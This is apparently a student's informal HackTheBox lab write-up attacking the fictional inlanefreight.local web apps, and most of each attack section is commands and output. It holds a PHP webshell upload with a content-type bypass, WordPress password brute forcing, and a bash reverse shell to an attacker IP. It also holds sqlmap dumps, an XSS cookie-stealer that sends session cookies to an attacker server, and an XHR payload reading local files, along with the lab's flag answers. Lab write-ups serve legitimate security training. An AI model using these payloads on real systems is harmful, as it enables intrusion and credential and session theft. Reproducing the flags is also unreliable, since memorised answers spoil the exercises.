so we are taught to use eyewitness ( https://github.com/FortyNorthSecurity/EyeWitness )  to help us with this, but first lets add all 11 subdomains to a file -> 

1. nano IL_subdomains 
2. inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local 

3. git clone https://github.com/FortyNorthSecurity/EyeWitness
4. cd EyeWitness/Python/setup
5. sudo ./setup.sh 
6. cd ..
7. make suer all subdomains are added to /etc/hosts as well 
8. make sure IL_subdomans file is in the /EyeWitness/Python path 
9. ./EyeWitness.py -f IL_Subs -d ILFREIGHT_subs_eyewitness
10. honestly didnt tell us much.. cool ANYWAY 




1.  Use the IDOR vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).
1. from reading the section were going to use careers.inlanefreight.local for this one so lets visit and make account. 
2. http://careers.inlanefreight.local/register -> make test account
3. once logged in we see the url pop ->  http://careers.inlanefreight.local/profile?id=9 
4. lets just play with the id= 
5. http://careers.inlanefreight.local/profile?id=4 -> HTB{8f40ecf17f681612246fa5728c159e46}


2.  Exploit the HTTP verb tampering vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).  ** need help with pattern recognition on this or how the fuck they figured this out??? *** 
1. http://dev.inlanefreight.local 
2. gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
<snipped>
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
/.htaccess.php        (Status: 403) [Size: 288]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]
/index.php            (Status: 200) [Size: 2048]
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]
/server-status        (Status: 403) [Size: 288]
/upload.php           (Status: 200) [Size: 14]
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/.php                 (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.hta.php             (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]

3. we see an uploads directory 
4. open burp 
5. intercept a request from http://dev.inlanefreight.local/upload.php -> send to repeater -> send -> Response -> 
HTTP/1.1 200 OK
Date: Sat, 22 Mar 2025 19:07:57 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 14
Content-Type: text/html; charset=UTF-8
Via: 1.1 dev.inlanefreight.local
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

403 Forbidden

6. k back it up, close and open burp again and just use burps browser -> go to http://dev.inlanefreight.local -> forward request then go to http://dev.inlanefreight.local/upload.php -> send to repeater and forward. we get 403 error 
7. in repeater change the request option to TRACK and send we get -> 200 status and we see X-Custom-IP-Authorization: 172.18.0.1 -> lets move that to the REQUEST side and make it X-Custom-IP-Authorization: 127.0.0.1 
8. hit send, then do the same from proxy and burp browser and forward and finally were at the actual upload.php page... * dumb * 
9. get to the response page of the TRACK reuqest and then go to browse, we can upload a webshell jsut save it with the .php extension 
10) <?php system($_GET['cmd']); ?>  -> save to sick.php
11. we see that upload failed adn we get the error -> JPG, JPEG, PNG & GIF files are allowed.
12. which shows that some weak client-side validation is likely in place. We can grab the POST request, send it to Repeater once again and try modifying the Content-Type: header in the request to see if we can trick the application into accepting our file as valid. We'll try altering the header to Content-Type: image/png
13. in burp repeater it worked and we see that it says File uploaded /uploads/sick.php
14. now e can confirm with curl in terminal -> curl -s http://dev.inlanefreight.local/uploads/sick.php?cmd=whoami
www-data
15. curl -s http://dev.inlanefreight.local/uploads/sick.php?cmd=ls+/var/www/html
css
flag.txt
images
index.php
js
upload.php
uploads
16. curl -s http://dev.inlanefreight.local/uploads/sick.php?cmd=cat+/var/www/html/flag.txt
css
flag.txt
images
index.php
js
upload.php
uploads
17. curl -s http://dev.inlanefreight.local/uploads/sick.php?cmd=cat+/var/www/html/flag.txt
HTB{57c7f6d939eeda90aa1488b15617b9fa}
 

oi fuckin vey m8888888888888888 


3.  Exploit the WordPress instance and find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}).
1. ok so we know were gonna be dealing with ir.inlanefreight.local from the material. 
2. sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
3. we find a vulnerable plugin with mastamail 
4. if we run sudo -e u -t 500 --url http://ir.inlanefreight.local we can enumerate users -> 
User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

5. ilfreightwp, john, tom, and james are all users in the wp site. 
6. we can try to brute force with this pass list https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt 
7. sudo wpscan --url http://ir.inlanefreight.local -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -U ilfreightwp
8. [+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - ilfreightwp / password1                                             
Trying ilfreightwp / 123123 Time: 00:00:00 <  > (10 / 109)  9.17%  ETA: ??:??:?? 
9. so we have login creds -> ilfreightwp:password1 
10. go to http://ir.inlanefreight.local/wp-login.php  login with creds 
11. once in admin page -> themes -> theme file editor http://ir.inlanefreight.local/wp-admin/theme-editor.php 
12. from wp-scans and prior boxes were gonna edit the 404 error page for twenty twenty theme 
13. add this -> exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.15.252/4444 0>&1'"); 
14. now nc -> nc -nlvp 4444
15 navigate to http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php
16.catch shell 
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.252] from (UNKNOWN) [10.129.245.86] 48434
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cat /var/www/html/flag.txt
HTB{e7134abea7438e937b87608eab0d979c}



4.  Enumerate the "status" database and retrieve the password for the "Flag" user. Submit the value as your answer.
1. from the reading we know we will be on status.inlanefreight.local 
2. first thing we see is a text form box we can use to exploit. since it mentions database we can assume SQLi
3. throw a single ' in that mawggggggggggg and we get this error 
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 
4. lets throw another ' in there and intercept with burp and run that mawwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwg thru sqlmap
5. below is the POST request that we should save to run 
POST / HTTP/1.1
Host: status.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://status.inlanefreight.local/
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://status.inlanefreight.local
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=8154uimi2ekfg6olur3glp1be5
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

searchitem=*

6. save as req.txt -> run sqlmap
7.  sqlmap -r req.txt --dbms=mysql
 this output validates that the search parameter is vulnerable. 
8. lets keep chipping away at this mugggggggggggg
9. sqlmap -r req.txt --dbms=mysql --dbs 
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys

10. so we now know there are 5 databases, lets keep chippin away -> we know were going to be looking in the status for the flag 
11. sqlmap -r req.txt --dbms=mysql -D status --tables
[2 tables]
+---------+
| company |
| users   |
+---------+

12. getting closer, enum users -> sqlmap -r req.txt --dbms=mysql -D status -T users --dump
 id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     

13. 1fbea4df249ac4f4881a5da387eb297cf 



5.  Steal an admin's session cookie and gain access to the support ticketing queue. Submit the flag value for the "John" user as your answer.
** k i know we skruggled with this one before but lets rip it, were gonna be on support.inlanefreight.local ** 
1. http://support.inlanefreight.local/
2. http://support.inlanefreight.local/ticket.php
3. lets test some xss -> open on terminal nc -nlvp 4444
4. in message form of ticket page ->  "><script src=http://10.10.15.252:4444/TESTING_THIS</script>
5. sure enuff -> nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.252] from (UNKNOWN) [10.129.144.194] 54816
GET /TESTING_THIS%3C/script HTTP/1.1
Host: 10.10.15.252:4444
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

6. from prior sections / experience we are going to need an index.php and script.js 
7. index.php: 
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

8. script.js:
new Image().src='http://10.10.15.252:4445/index.php?c='+document.cookie

9. start php server wherever the two scripts are -> sudo php -S 0.0.0.0:4445

10. use this as XSS -> "><script src=http://10.10.15.252:4445/script.js></script>

11. now in the php server you should get -> 
[Sun Mar 23 12:02:00 2025] 10.129.144.194:37656 [200]: GET /script.js
[Sun Mar 23 12:02:00 2025] 10.129.144.194:37656 Closing
[Sun Mar 23 12:02:00 2025] 10.129.144.194:37658 Accepted
[Sun Mar 23 12:02:00 2025] 10.129.144.194:37658 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99

12. inspector -> storage -> cookies -> + -> session fcfaf93ab169bc943b92109f0a845d99 -> hit refresh OR login page -> redirects to /dashboard.php 
13. 9818 	John 	HTB{1nS3cuR3_c00k135} 


6.  Use the SSRF to Local File Read vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).
** this one is a lil outta the box thinking. ** 

1. tracking.inlanefreight.local 
2. theres a tracking text form to test out, i just put in 123 and was lead to a pdf page (same url) 
output: 
Cargo Tracking
Order ID:
532586662331596000
Estimated Delivery time:
2025-5-7
Shipping BY:
BLUEDART, | +1598675986
Status:
Not Verified
Tracking #:
123


3. oogling for something such as pdf HTML injection vulnerability returns several interesting hits such as this https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90 and this https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f discussing leveraging HTML injection, XSS, and SSRF for local file read. Now, while not covered in the Penetration Tester Job Role Path, it is important to note that we will often come across new things during our assessments.

4. so after some reading and research we google some PDF XHR -> read file exploits: 

<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>

so putting this in the text field SHOULD give us the /etc/passwd lets try it

5. and gang gang -> 
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr <snipped> 

6. now how can we use this to get the flag... 
7. <script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:/flag.txt");
	x.send();
	</script>

8. HTB{49f0bad299687c62334182178bfd75d8}




7.  Register an account and log in to the Gitlab instance. Submit the flag value (flag format : HTB{}).

8. Use the XXE vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).

9.  Use the command injection vulnerability to find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}).

